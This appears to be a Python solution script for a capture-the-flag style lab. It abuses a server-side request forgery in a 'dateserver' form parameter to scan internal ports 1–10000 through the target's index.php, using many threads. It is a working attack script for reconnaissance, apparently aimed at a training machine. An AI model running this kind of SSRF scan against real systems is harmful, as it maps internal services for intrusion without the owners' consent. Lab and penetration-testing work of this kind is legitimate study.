import requests  # For making HTTP requests
from concurrent.futures import ThreadPoolExecutor, as_completed  # For thread pool management

def scan_port(hostname, port):
    try:
        # Target URL for the scan
        url = f"http://{hostname}/index.php"

        # Custom headers to mimic a browser request
        headers = {
            "Host": f"{hostname}",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        # Data sent in the POST request, with the port to scan
        data = f"dateserver=http://dateserver.htb%3a{port}/availability.php&date=2024-01-01"

        # Send the POST request and get the response
        response = requests.post(url, headers=headers, data=data, verify=False)
        errorCode = 'Something went wrong!'  # Error string to check in response

        # If the error code is not in the response, the port is open or responding differently
        if errorCode not in response.text:
            return port
        else:
            return None
    
    except:
        # Ignore any errors (e.g., timeout, connection error)
        pass

def main():
    hostname = "10.129.10.206"

    ports = range(1, 10000+1)  # Ports to scan: 1 to 10,000
    max_workers = 50  # Number of threads to use concurrently

    # Create a thread pool and submit scan tasks
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_port, hostname, port): port for port in ports}

        # As each scan completes, check the result and print if open
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                print(f"Port {result} is open or responding differently.")

if __name__ == "__main__":
    main()  # Run the main function if this script is executed directly